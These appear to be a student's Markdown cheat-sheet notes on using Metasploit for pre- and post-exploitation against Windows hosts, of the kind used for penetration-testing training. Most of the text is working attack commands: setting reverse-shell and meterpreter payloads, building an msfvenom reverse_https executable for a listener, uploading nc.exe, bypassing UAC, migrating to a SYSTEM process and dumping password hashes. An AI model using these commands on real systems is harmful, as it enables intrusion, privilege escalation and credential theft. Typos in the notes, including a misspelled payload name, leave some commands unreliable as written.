# Metasploit Pre Exploitation
- options:
  - global variables: `set -> setg` for THREADS and/or RHOSTS, etc...
## Auxiliary Modules
- `show auxiliary`
### SNMP Auxiliary Module
- `search snmp`
  - example: `auxiliary/scanner/snmp/snmp_enum`
    - `use auxiliary/scanner/snmp/snmp_enum`
    - `info`
    - `show options`
    - `set ...`
    - `run`
### SMB Auxiliary Module
- `use auxiliary/scanner/smb/smb_version`

## Database Services
> Commands within metasploit
- `hosts`
- `db_nmap 192.168.31.200-254 --top-ports 20`
- `services -p 443`

## Exploit Modules
- `search pop3`
- `use ...`
- `show options`
- `set PAYLOAD windows/... (TAB to see more)`
- `set PAYLOAD windows/shell_reverse_tcp`
- `exploit`

## Payloads
> Staged and Non staged shell code.  
Mterpreter - staged multi-function payload that cn be extended in runtime.  

- `set PAYLOAD windows/meterpreter/reverce_tcp`
- `exploit`
- `meterpreter > help`
- commands
  - `sysinfo`, `getuid`, `search -f *pass*.txt`
  - `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec`
  - `download c:\\windows\\system32\calc.exe /tmp/calc.exe`
  - `shell`
  - `exit -y`

## Additional payloads
- `use windows/meterpreter/reverse_https`
> Tunnel communication over HTTPS usil SSL, Inject he meterpreter server DLL via Reflective Dll Ijection payload (staged).
> Helps us avoid 'deep packet inspection' services.
- `use windows/meterpreter/reverse_tcp_allports`
> Try to connect back to the attacker machine on all possible ports (slowly)

## Binary payloads
- `msfvenom -l`
### The creation of the payload
- `msfvenom -p windows/meterpreter/reverse_https LHOST=kali-ip LPORT=443 -f exe --platform windows -a x86 > /var/www/html/reverse_met_https.exe`
### The creation of the matching listener
> The Multihandler Module (via msfconsole)
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
show options
set LHOST 10.11.0.179
set LPORT 443
exploit
```
## Porting Exploits to MSF

# Metasploit Post Exploitation
```
msfconsole ...
set ... 
use ...
exploit
```
```
# within a meterpreter session
getuid
getprivs (checking for UAC)

# bypassing UAC
background
use exploit/windows/local/bypassuac
show options (we need session ID)
# list sessions
sessions -l
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST xxx
set LPORT 8888
clear
# executing the exploit on session #1
run
# a new session will be created which have bypassed UAC restrictions
# check by executing getprivs
getprivs
hashdump (still fails)
# we need system privleges -> migrate our current meterpreter process
ps
# look for running process with SYSTEM privleges
migrate %the process ID% (from the list)
getuid
hashdump (it will work now)
```
